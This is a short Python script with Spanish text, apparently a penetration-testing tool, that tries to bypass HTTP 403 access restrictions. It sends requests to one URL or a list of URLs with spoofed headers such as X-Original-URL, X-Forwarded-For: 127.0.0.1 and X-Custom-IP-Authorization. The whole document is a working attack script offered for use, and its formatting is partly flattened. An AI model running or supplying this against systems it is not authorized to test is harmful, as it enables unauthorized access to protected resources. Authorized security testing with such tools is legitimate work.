#!/usr/bin/env python3 import requests import argparse from urllib.parse import urlparse

Lista de headers comunes para bypass

HEADERS_LIST = [ {"User-Agent": "Mozilla/5.0"}, {"X-Original-URL": "{path}"}, {"X-Custom-IP-Authorization": "127.0.0.1"}, {"X-Forwarded-For": "127.0.0.1"}, {"Referer": "{url}"} ]

def try_bypass(url, code_filter=None): parsed = urlparse(url) path = parsed.path or "/" results = []

print(f"[*] Escaneando: {url}\n")
for headers in HEADERS_LIST:
    # Reemplazar variables dinámicas
    modified_headers = {k: v.format(path=path, url=url) for k, v in headers.items()}
    try:
        r = requests.get(url, headers=modified_headers, timeout=10)
        if code_filter is None or r.status_code == code_filter:
            results.append((r.status_code, modified_headers))
            print(f"[{r.status_code}] con headers: {modified_headers}")
    except Exception as e:
        print(f"[!] Error con headers {modified_headers}: {e}")
return results

def load_urls(file): with open(file, 'r') as f: return [line.strip() for line in f if line.strip()]

def save_results(results, filename): with open(filename, 'w') as f: for status, headers in results: f.write(f"[{status}] {headers}\n") print(f"\n✅ Resultados guardados en: {filename}")

def main(): parser = argparse.ArgumentParser(description="🔓 Herramienta de bypass 403 de Disrupción Bill") parser.add_argument("-u", "--url", help="URL única a escanear") parser.add_argument("-l", "--list", help="Archivo con múltiples URLs") parser.add_argument("--status", type=int, help="Filtrar por código de estado (por ejemplo, 200)") parser.add_argument("--save", help="Archivo de salida para guardar resultados") args = parser.parse_args()

all_results = []
if args.url:
    all_results = try_bypass(args.url, args.status)
elif args.list:
    urls = load_urls(args.list)
    for url in urls:
        print("=" * 60)
        result = try_bypass(url, args.status)
        all_results.extend(result)
else:
    print("[!] Debes proporcionar una URL (-u) o una lista de URLs (-l)")
    return

if args.save:
    save_results(all_results, args.save)

if name == "main": main()

